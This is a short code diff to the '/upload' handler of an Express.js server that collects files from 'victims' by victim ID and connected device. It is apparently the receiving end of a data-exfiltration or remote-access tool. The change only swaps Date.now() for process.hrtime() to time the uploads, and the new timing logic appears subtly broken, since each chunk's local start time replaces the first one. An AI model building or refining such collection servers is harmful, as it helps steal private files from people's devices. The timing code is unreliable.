@@ -101,8 +101,8 @@ app.post('/upload', (req, res) => {
     const victimFolder = victimFolders[victimId];
     const filePath = path.join(victimFolder, filename);
 
-    // Track the start time for the file upload
-    const startTime = Date.now();
+    // Track the start time for the file upload using process.hrtime for high-resolution time tracking
+    const startTime = process.hrtime();
     if (!connectedDevices[victimId].fileStartTimes[filename]) {
       connectedDevices[victimId].fileStartTimes[filename] = startTime;
     }
@@ -126,9 +126,10 @@ app.post('/upload', (req, res) => {
         console.log(`✅ File upload complete: ${filename}`);
 
         // Calculate total upload time once all chunks are received
-        const endTime = Date.now();
+        const endTime = process.hrtime(startTime);
         connectedDevices[victimId].fileEndTimes[filename] = endTime; // Record end time for this file
-        const uploadDuration = (endTime - startTime) / 1000; // in seconds
+        const uploadDuration = endTime[0] + endTime[1] / 1e9; // Convert to seconds (seconds + nanoseconds)
+
         connectedDevices[victimId].totalUploadTime += uploadDuration;
 
         // Track the transfer time for this file
